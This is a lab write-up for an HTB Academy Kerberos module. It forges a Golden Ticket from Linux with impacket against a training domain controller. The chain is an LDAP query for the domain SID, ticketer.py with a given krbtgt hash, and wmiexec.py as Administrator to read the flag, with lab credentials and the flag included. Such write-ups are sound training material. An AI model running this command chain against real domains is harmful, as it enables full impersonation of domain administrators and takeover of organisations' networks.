# Golden Ticket from Linux

**Module:** HTB Academy — Kerberos Attacks
**Target:** `ACADEMY-KERBATTCK-2-DC01` (10.129.70.131), domain `INLANEFREIGHT.LOCAL`
**Given access:** `htb-student` / `HTB_@cademy_stdnt!` (domain creds, direct auth to DC01 — no RDP)
**Given:** krbtgt NTLM hash `c0231bd8a4a4de92fca0760c0ba9e7a6`
**Goal:** read `C:\Users\Administrator\Documents\goldenticket.txt` on DC01

**Result:** `G0lD3n_T1CK3t_IMp3rs0nat10N_Fr0M_L1nUX` — Administrator access on DC01 via a forged Golden Ticket, entirely from Linux with impacket, no GUI/RDP step at all.

---

## 1. Attack chain

1. Confirm creds: `nxc smb 10.129.70.131 -u htb-student -p 'HTB_@cademy_stdnt!'` — domain auth works directly against DC01 itself (unlike the companion `Golden Ticket.md` task, where the given account only had RDP to a separate workstation and the DC had to be reached via a network pivot).
2. Get the **real** domain SID straight from LDAP against the DC, not from `lookupsid.py` against a non-DC host (see prior task's writeup for why that's unreliable). Bind as `htb-student` over `ldap3`/NTLM to `10.129.70.131`, search `Administrator`'s `objectSid`, strip the trailing `-500` RID.
3. `ticketer.py -nthash <krbtgt hash> -domain-sid <real SID> -domain INLANEFREIGHT.LOCAL Administrator` → forge a TGT for Administrator, saved as a ccache.
4. `KRB5CCNAME=.../Administrator.ccache wmiexec.py -k -no-pass` with `-dc-ip`/`-target-ip` pointed at DC01 → command execution as Administrator → read the flag.

---

## 2. Notes

This run matches the domain SID (`S-1-5-21-1870146311-1183348186-593267556`) found the hard way in the companion `Golden Ticket.md` task — same lab domain template. Having already learned (per that task) not to trust `lookupsid.py` against a non-DC host, and to pull the SID directly from an LDAP bind against the real DC instead, this task had no blockers: `htb-student` authenticates straight to DC01 (no pivot needed, since access here is domain creds to the DC itself rather than RDP to a separate workstation), so the correct SID was obtained on the first query and the forged ticket worked immediately.

---

## 3. Full command sequence

```bash
# 1. Confirm creds
nxc smb 10.129.70.131 -u htb-student -p 'HTB_@cademy_stdnt!'

# 2. Real domain SID via direct LDAP bind to the DC
python3 -c "
from ldap3 import Server, Connection, NTLM, ALL
s = Server('10.129.70.131', get_info=ALL)
c = Connection(s, user='INLANEFREIGHT\\\\htb-student', password='HTB_@cademy_stdnt!',
               authentication=NTLM, auto_bind=True)
c.search('DC=INLANEFREIGHT,DC=LOCAL', '(sAMAccountName=Administrator)', attributes=['objectSid'])
print(c.entries[0].objectSid)
"
# S-1-5-21-1870146311-1183348186-593267556-500

# 3. Forge the Golden Ticket
ticketer.py -nthash c0231bd8a4a4de92fca0760c0ba9e7a6 \
    -domain-sid S-1-5-21-1870146311-1183348186-593267556 \
    -domain INLANEFREIGHT.LOCAL Administrator
# -> Administrator.ccache

# 4. Use it
export KRB5CCNAME="$(pwd)/Administrator.ccache"
wmiexec.py -k -no-pass -dc-ip 10.129.70.131 -target-ip 10.129.70.131 \
    'INLANEFREIGHT.LOCAL/Administrator@DC01.INLANEFREIGHT.LOCAL' \
    "type C:\Users\Administrator\Documents\goldenticket.txt"
# G0lD3n_T1CK3t_IMp3rs0nat10N_Fr0M_L1nUX
```

---

## 4. Flag

**`G0lD3n_T1CK3t_IMp3rs0nat10N_Fr0M_L1nUX`**

---

## 5. Key takeaways

- A Golden Ticket needs exactly two inputs: the krbtgt NTLM hash and the correct domain SID — `impacket-ticketer` handles all PAC/ticket construction.
- Always get the domain SID via a direct LDAP query against the DC (any object's `objectSid`, strip the trailing RID). `lookupsid.py` against a non-DC host is not reliable — confirmed the hard way in the companion `Golden Ticket.md` task in this same domain.
- When the given account can authenticate straight to the DC (vs. only having RDP to a separate workstation), the whole chain collapses to four commands with no pivoting — the complexity in the companion task came entirely from the access path, not from Golden Ticket forging itself.
